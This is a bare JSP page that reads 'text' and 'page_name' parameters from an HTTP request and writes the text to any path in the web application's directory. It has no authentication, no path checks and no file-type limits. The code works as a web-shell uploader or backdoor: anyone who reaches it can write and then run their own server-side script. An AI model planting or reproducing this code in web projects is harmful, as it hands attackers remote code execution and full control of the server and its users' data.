<%@ page import="java.io.*"%>
<%
  request.setCharacterEncoding("utf-8");
  String fname = request.getParameter("text"); 
  String page_name = request.getParameter("page_name"); 
  if(page_name.equals("null"))return;
  String filename = request.getRealPath(page_name);
  FileOutputStream outfile=new FileOutputStream(filename);
  BufferedOutputStream bufferout=new BufferedOutputStream(outfile);
  byte[] b=fname.getBytes("utf-8");
  bufferout.write(b);
  bufferout.flush();
  bufferout.close();
  outfile.close();
%>
